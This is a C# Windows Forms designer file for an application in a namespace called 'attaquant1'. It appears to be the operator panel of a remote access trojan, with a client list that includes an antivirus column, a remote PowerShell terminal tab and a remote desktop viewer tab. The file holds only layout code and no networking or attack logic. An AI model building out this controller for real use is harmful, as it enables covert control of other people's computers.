using System.Windows.Forms;

namespace attaquant1
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.tabControl = new System.Windows.Forms.TabControl();
            this.tabServer = new System.Windows.Forms.TabPage();
            this.tabPowerShell = new System.Windows.Forms.TabPage();
            this.tabRemoteDesktop = new System.Windows.Forms.TabPage();
            this.StartServerButton = new System.Windows.Forms.Button();
            this.ServerStatusLabel = new System.Windows.Forms.Label();
            this.ClientDataGridView = new System.Windows.Forms.DataGridView();
            this.LogTextBox = new System.Windows.Forms.TextBox();
            this.PSTerminalInput = new System.Windows.Forms.TextBox();
            this.PSTerminalOutput = new System.Windows.Forms.TextBox();
            this.PSSendButton = new System.Windows.Forms.Button();
            this.RemoteDesktopPictureBox = new System.Windows.Forms.PictureBox();
            this.StartRemoteDesktopButton = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.ClientDataGridView)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.RemoteDesktopPictureBox)).BeginInit();
            this.tabControl.SuspendLayout();
            this.tabServer.SuspendLayout();
            this.tabPowerShell.SuspendLayout();
            this.tabRemoteDesktop.SuspendLayout();
            this.SuspendLayout();
            // 
            // tabControl
            // 
            this.tabControl.Controls.Add(this.tabServer);
            this.tabControl.Controls.Add(this.tabPowerShell);
            this.tabControl.Controls.Add(this.tabRemoteDesktop);
            this.tabControl.Location = new System.Drawing.Point(12, 12);
            this.tabControl.Name = "tabControl";
            this.tabControl.SelectedIndex = 0;
            this.tabControl.Size = new System.Drawing.Size(776, 498);
            this.tabControl.TabIndex = 0;
            // 
            // tabServer
            // 
            this.tabServer.Controls.Add(this.StartServerButton);
            this.tabServer.Controls.Add(this.ServerStatusLabel);
            this.tabServer.Controls.Add(this.ClientDataGridView);
            this.tabServer.Controls.Add(this.LogTextBox);
            this.tabServer.Location = new System.Drawing.Point(4, 22);
            this.tabServer.Name = "tabServer";
            this.tabServer.Padding = new System.Windows.Forms.Padding(3);
            this.tabServer.Size = new System.Drawing.Size(768, 472);
            this.tabServer.TabIndex = 0;
            this.tabServer.Text = "Server Control";
            this.tabServer.UseVisualStyleBackColor = true;
            // 
            // tabPowerShell
            // 
            this.tabPowerShell.Controls.Add(this.PSTerminalOutput);
            this.tabPowerShell.Controls.Add(this.PSSendButton);
            this.tabPowerShell.Controls.Add(this.PSTerminalInput);
            this.tabPowerShell.Location = new System.Drawing.Point(4, 22);
            this.tabPowerShell.Name = "tabPowerShell";
            this.tabPowerShell.Padding = new System.Windows.Forms.Padding(3);
            this.tabPowerShell.Size = new System.Drawing.Size(768, 472);
            this.tabPowerShell.TabIndex = 1;
            this.tabPowerShell.Text = "PowerShell Terminal";
            this.tabPowerShell.UseVisualStyleBackColor = true;
            // 
            // tabRemoteDesktop
            // 
            this.tabRemoteDesktop.Controls.Add(this.RemoteDesktopPictureBox);
            this.tabRemoteDesktop.Controls.Add(this.StartRemoteDesktopButton);
            this.tabRemoteDesktop.Location = new System.Drawing.Point(4, 22);
            this.tabRemoteDesktop.Name = "tabRemoteDesktop";
            this.tabRemoteDesktop.Padding = new System.Windows.Forms.Padding(3);
            this.tabRemoteDesktop.Size = new System.Drawing.Size(768, 472);
            this.tabRemoteDesktop.TabIndex = 2;
            this.tabRemoteDesktop.Text = "Remote Desktop";
            this.tabRemoteDesktop.UseVisualStyleBackColor = true;
            // 
            // StartServerButton
            // 
            this.StartServerButton.Location = new System.Drawing.Point(6, 6);
            this.StartServerButton.Name = "StartServerButton";
            this.StartServerButton.Size = new System.Drawing.Size(100, 30);
            this.StartServerButton.TabIndex = 0;
            this.StartServerButton.Text = "Start Server";
            this.StartServerButton.UseVisualStyleBackColor = true;
            this.StartServerButton.Click += new System.EventHandler(this.StartServerButton_Click);
            // 
            // ServerStatusLabel
            // 
            this.ServerStatusLabel.AutoSize = true;
            this.ServerStatusLabel.Location = new System.Drawing.Point(124, 14);
            this.ServerStatusLabel.Name = "ServerStatusLabel";
            this.ServerStatusLabel.Size = new System.Drawing.Size(82, 13);
            this.ServerStatusLabel.TabIndex = 1;
            this.ServerStatusLabel.Text = "Server stopped";
            // 
            // ClientDataGridView
            // 
            this.ClientDataGridView.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.ClientDataGridView.Location = new System.Drawing.Point(6, 54);
            this.ClientDataGridView.Name = "ClientDataGridView";
            this.ClientDataGridView.Size = new System.Drawing.Size(550, 200);
            this.ClientDataGridView.TabIndex = 2;
            this.ClientDataGridView.Columns.Add("ClientID", "Client ID");
            this.ClientDataGridView.Columns.Add("PCName", "PC Name");
            this.ClientDataGridView.Columns.Add("LanIP", "LAN IP");
            this.ClientDataGridView.Columns.Add("Time", "Time");
            this.ClientDataGridView.Columns.Add("AV", "AV");
            // 
            // 
            // LogTextBox
            // 
            this.LogTextBox.Location = new System.Drawing.Point(574, 6);
            this.LogTextBox.Multiline = true;
            this.LogTextBox.Name = "LogTextBox";
            this.LogTextBox.ReadOnly = true;
            this.LogTextBox.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.LogTextBox.Size = new System.Drawing.Size(188, 282);
            this.LogTextBox.TabIndex = 4;
            // 
            // PSTerminalInput
            // 
            this.PSTerminalInput.Location = new System.Drawing.Point(6, 6);
            this.PSTerminalInput.Name = "PSTerminalInput";
            this.PSTerminalInput.Size = new System.Drawing.Size(700, 25);
            this.PSTerminalInput.TabIndex = 0;
            // 
            // PSTerminalOutput
            // 
            this.PSTerminalOutput.Location = new System.Drawing.Point(6, 37);
            this.PSTerminalOutput.Multiline = true;
            this.PSTerminalOutput.Name = "PSTerminalOutput";
            this.PSTerminalOutput.ReadOnly = true;
            this.PSTerminalOutput.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.PSTerminalOutput.Size = new System.Drawing.Size(756, 400);
            this.PSTerminalOutput.TabIndex = 1;
            // 
            // PSSendButton
            // 
            this.PSSendButton.Location = new System.Drawing.Point(712, 6);
            this.PSSendButton.Name = "PSSendButton";
            this.PSSendButton.Size = new System.Drawing.Size(50, 25);
            this.PSSendButton.TabIndex = 2;
            this.PSSendButton.Text = "Send";
            this.PSSendButton.UseVisualStyleBackColor = true;
            this.PSSendButton.Click += new System.EventHandler(this.PSSendButton_Click);
            // 
            // RemoteDesktopPictureBox
            // 
            this.RemoteDesktopPictureBox.Location = new System.Drawing.Point(6, 40);
            this.RemoteDesktopPictureBox.Name = "RemoteDesktopPictureBox";
            this.RemoteDesktopPictureBox.Size = new System.Drawing.Size(756, 426);
            this.RemoteDesktopPictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.RemoteDesktopPictureBox.TabIndex = 0;
            this.RemoteDesktopPictureBox.TabStop = false;
            // 
            // StartRemoteDesktopButton
            // 
            this.StartRemoteDesktopButton.Location = new System.Drawing.Point(6, 6);
            this.StartRemoteDesktopButton.Name = "StartRemoteDesktopButton";
            this.StartRemoteDesktopButton.Size = new System.Drawing.Size(120, 30);
            this.StartRemoteDesktopButton.TabIndex = 1;
            this.StartRemoteDesktopButton.Text = "Start Remote Desktop";
            this.StartRemoteDesktopButton.UseVisualStyleBackColor = true;
            this.StartRemoteDesktopButton.Click += new System.EventHandler(this.StartRemoteDesktopButton_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 520);
            this.Controls.Add(this.tabControl);
            this.Name = "Form1";
            this.Text = "Tutorial Server";
            ((System.ComponentModel.ISupportInitialize)(this.ClientDataGridView)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.RemoteDesktopPictureBox)).EndInit();
            this.tabControl.ResumeLayout(false);
            this.tabServer.ResumeLayout(false);
            this.tabServer.PerformLayout();
            this.tabPowerShell.ResumeLayout(false);
            this.tabPowerShell.PerformLayout();
            this.tabRemoteDesktop.ResumeLayout(false);
            this.ResumeLayout(false);
        }

        private System.Windows.Forms.TabControl tabControl;
        private System.Windows.Forms.TabPage tabServer;
        private System.Windows.Forms.TabPage tabPowerShell;
        private System.Windows.Forms.TabPage tabRemoteDesktop;
        private System.Windows.Forms.Button StartServerButton;
        private System.Windows.Forms.Label ServerStatusLabel;
        private System.Windows.Forms.DataGridView ClientDataGridView;
        private System.Windows.Forms.TextBox LogTextBox;
        private System.Windows.Forms.TextBox PSTerminalInput;
        private System.Windows.Forms.TextBox PSTerminalOutput;
        private System.Windows.Forms.Button PSSendButton;
        private System.Windows.Forms.PictureBox RemoteDesktopPictureBox;
        private System.Windows.Forms.Button StartRemoteDesktopButton;
    }
}